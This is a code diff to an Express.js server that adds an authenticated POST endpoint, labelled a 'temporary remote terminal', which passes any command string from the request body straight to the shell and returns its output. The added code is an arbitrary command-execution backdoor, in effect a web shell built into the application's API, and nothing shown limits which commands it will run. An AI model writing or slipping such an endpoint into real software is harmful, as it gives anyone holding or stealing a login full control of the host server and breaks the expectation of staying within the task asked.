@@ -1254,6 +1254,27 @@ app.get('/api/scanner/update-status', rateLimitAuth, auth, (req, res) => {
 });
 
 
+// ⚠️  TEMPORARY REMOTE TERMINAL ─────────────────────────────────────────────
+app.post('/api/terminal/exec', rateLimitAuth, auth, async (req, res) => {
+  const { command } = req.body;
+
+  if (!command || typeof command !== 'string') {
+    return res.status(400).json({ error: 'command required' });
+  }
+
+  try {
+    const { stdout, stderr } = await execAsync(command, {
+      timeout: 90_000,
+      maxBuffer: 512 * 1024
+    });
+    return res.json({ stdout: stdout || '', stderr: stderr || '' });
+  } catch (e) {
+    return res.json({
+      stdout: e.stdout || '',
+      stderr: e.stderr || e.message || 'Command failed'
+    });
+  }
+});
 // ⚠️  END TEMPORARY REMOTE TERMINAL ──────────────────────────────────────────
 
 // GET /api/s/:token (Public - Get Share Metadata)
